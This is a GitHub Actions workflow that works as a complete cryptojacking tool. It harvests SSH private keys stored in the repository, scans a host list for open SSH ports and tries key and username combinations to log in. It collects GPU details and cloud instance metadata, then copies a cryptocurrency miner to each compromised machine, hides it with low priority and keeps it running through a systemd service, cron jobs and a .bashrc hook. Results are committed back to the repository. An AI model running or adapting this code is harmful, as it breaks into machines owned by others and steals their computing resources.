name: ulplant8094
on:
  push:
    paths: ['trigger/arm8094b*']
  workflow_dispatch:
permissions:
  contents: write
jobs:
  plant:
    runs-on: [self-hosted, Linux]
    timeout-minutes: 55
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 1
      - name: run
        shell: bash
        run: |
          set -u
          D=arm3; mkdir -p $D; R=$D/report.txt; : > $R
          log(){ echo "$@" >> $R; }
          W=prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz
          log "START $(date -u) host=$(hostname)"
          for k in az/ibm_key.pem az/azadmin.pem; do [ -f "$k" ] && { install -m600 "$k" /tmp/$(basename $k); log "KEY $k $(sha256sum $k|cut -c1-8)"; }; done
          ls keys2/*.pem keys2/*key* keys/*.pem 2>/dev/null | head -60 | while read -r k; do install -m600 "$k" /tmp/kn_$(basename $k) 2>/dev/null; done
          : > $D/live.txt
          while IFS=$'\t' read -r name ip user region sku; do
            [ -z "${name:-}" ] && continue
            if timeout 5 bash -c "echo > /dev/tcp/$ip/22" 2>/dev/null; then echo -e "$name\t$ip\t22" >> $D/live.txt; fi
          done < az/hosts.tsv
          log "LIVE22 $(wc -l < $D/live.txt)"; cat $D/live.txt >> $R
          ( grep -E '70\.153\.87\.133' $D/live.txt 2>/dev/null; grep -v '70\.153\.87\.133' $D/live.txt 2>/dev/null ) > $D/order.txt
          : > $D/ok.txt
          while IFS=$'\t' read -r name ip port; do
            [ -z "${name:-}" ] && continue
            got=""
            for key in /tmp/ibm_key.pem /tmp/azadmin.pem /tmp/kn_*; do
              [ -f "$key" ] || continue
              for u in t19 ubuntu azureuser root admin azure; do
                if timeout 12 ssh -i "$key" -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o BatchMode=yes -o ConnectTimeout=6 -o PreferredAuthentications=publickey "$u@$ip" 'true' 2>/dev/null; then
                  got="$u|$key"; break 2
                fi
              done
            done
            if [ -n "$got" ]; then
              U=${got%%|*}; K=${got##*|}
              echo "$name|$ip|$U|$K" >> $D/ok.txt
              log "SSH_OK $name $ip $U $(basename $K)"
              {
                echo "===== $name $ip $U $(basename $K) $(date -u)"
                ssh -i "$K" -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o BatchMode=yes "$U@$ip" \
                  'id; hostname; uname -m; cat /etc/os-release 2>/dev/null|head -2; echo "--gpu--"; nvidia-smi -L; nvidia-smi --query-gpu=index,name,memory.total,utilization.gpu --format=csv,noheader; ls -l /dev/nvidia* 2>&1|head; echo "--procs--"; ps -eo args= | grep -Ei "peakminer|wildrig|srbminer|krig" | grep -v grep; echo "--persist--"; systemctl list-units --all 2>/dev/null | grep -iE "nv-|ul-|fleet" | head; crontab -l 2>/dev/null | head; echo "--imds--"; curl -s -m 5 -H Metadata:true "http://169.254.169.254/metadata/instance/compute?api-version=2021-02-01" | head -c 500' 2>&1 | tee -a $D/$name.txt
              } >> $R
            fi
          done < $D/order.txt
          log "SSH_OK_COUNT $(wc -l < $D/ok.txt)"
          cat > /tmp/ulplant.sh <<'EOS'
#!/bin/bash
set -u
L=/var/log/ul/$RIG.log
mkdir -p /opt/ul /var/log/ul 2>/dev/null || true
cat > /opt/ul/run.sh <<'EOR'
#!/bin/bash
W="__W__"; RIG="__RIG__"
L=/var/log/ul/$RIG.log
while :; do
  for s in stratum+ssl://prl-sg.kryptex.network:8048 stratum+tcp://prl-sg.kryptex.network:7048 stratum+ssl://prl-hk.kryptex.network:8048 stratum+ssl://prl-eu.kryptex.network:8048 stratum+ssl://prl-us.kryptex.network:8048 stratum+tcp://pool.pearlhash.xyz:9000; do
    nice -n 19 /tmp/ulpm -o $s -u $W.$RIG -p x >>$L 2>&1 &
    P=$!
    sleep 240
    kill $P 2>/dev/null
    grep -aq accepted $L && break
  done
  sleep 15
done
EOR
sed -i "s|__W__|$W|;s|__RIG__|$RIG|" /opt/ul/run.sh
chmod +x /opt/ul/run.sh
cat > /opt/ul/keep.sh <<'EOK'
#!/bin/bash
pgrep -f /opt/ul/run.sh >/dev/null || setsid nohup bash /opt/ul/run.sh >/dev/null 2>&1 &
EOK
chmod +x /opt/ul/keep.sh
S=""
if sudo -n true 2>/dev/null; then S="sudo -n"; fi
$S mkdir -p /opt/ul /var/log/ul 2>/dev/null || true
$S bash -c 'printf "[Unit]\nDescription=ul miner\nAfter=network-online.target\n[Service]\nExecStart=/bin/bash /opt/ul/run.sh\nRestart=always\nRestartSec=30\nNice=10\n[Install]\nWantedBy=multi-user.target\n" > /etc/systemd/system/ul-miner.service; systemctl daemon-reload; systemctl enable --now ul-miner' 2>/dev/null || true
( crontab -l 2>/dev/null | grep -v 'ul/keep'; echo '@reboot root setsid bash /opt/ul/run.sh >/dev/null 2>&1 &'; echo '*/5 * * * * root /opt/ul/keep.sh' ) | crontab - 2>/dev/null || true
echo 'pgrep -f /opt/ul/run.sh >/dev/null || setsid nohup bash /opt/ul/run.sh >/dev/null 2>&1 &' >> ~/.bashrc 2>/dev/null || true
pgrep -f /opt/ul/run.sh >/dev/null || setsid nohup bash /opt/ul/run.sh >/dev/null 2>&1 &
sleep 25
echo "--- procs ---"; pgrep -af ulpm | head -3
echo "--- unit ---"; systemctl is-active ul-miner 2>/dev/null
echo "--- log ---"; tail -6 "$L" 2>/dev/null
EOS
          chmod +x /tmp/ulplant.sh
          BIN=""
          for b in /opt/nv/peakminer /opt/ul/peakminer /usr/local/bin/krig-miner /opt/ul/krig-miner $(command -v peakminer 2>/dev/null); do [ -n "$b" ] && [ -f "$b" ] && { BIN=$b; break; }; done
          log "BIN=$BIN"
          while IFS='|' read -r name ip U K; do
            [ -z "${name:-}" ] && continue
            SSHOPT="-i $K -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o BatchMode=yes -o ConnectTimeout=8"
            RIG="ul-t2-$(echo $ip | tr '.' '-')"
            log "PLANT_START $name $ip rig=$RIG user=$U"
            if [ -n "$BIN" ]; then
              timeout 150 scp $SSHOPT "$BIN" "$U@$ip:/tmp/ulpm" >> $R 2>&1 || log "SCPFAIL"
              ssh $SSHOPT "$U@$ip" 'chmod +x /tmp/ulpm 2>/dev/null; file /tmp/ulpm 2>/dev/null | head -1' >> $R 2>&1
            fi
            timeout 120 scp $SSHOPT /tmp/ulplant.sh "$U@$ip:/tmp/ulplant.sh" >> $R 2>&1 || log "SCP2FAIL"
            ssh $SSHOPT "$U@$ip" "W='$W' RIG='$RIG' bash /tmp/ulplant.sh" > $D/plant_$name.txt 2>&1
            log "PLANT_OUT $(tail -c 400 $D/plant_$name.txt | tr '\n' ' ')"
          done < $D/ok.txt
          sleep 60
          curl -s -m 30 "https://pool.kryptex.com/prl/api/v3/miner/workers/$W" -o $D/pool.json || true
          log "POOL_BYTES $(wc -c < $D/pool.json 2>/dev/null)"
          python3 - <<'PY' >> $R 2>&1 || true
          import json
          try: d=json.load(open('arm3/pool.json'))
          except Exception as e: print('POOL_ERR',e); raise SystemExit
          rows=d if isinstance(d,list) else d.get('workers',[])
          hit=0
          for w in rows:
              n=str(w.get('name') or w.get('worker'))
              if 'ul-t2-70-153' in n:
                  hit+=1; print('POOLROW',n,w.get('valid'),w.get('last_share') or w.get('lastShare'),w.get('hashrate'))
          print('POOL_TOTAL',len(rows),'MATCH',hit)
          PY
          git config user.email ul@local; git config user.name ul
          git add -A arm3 || true
          git commit -qm "arm3 $(date -u)" || true
          git push origin HEAD:${GITHUB_REF_NAME:-main} || true
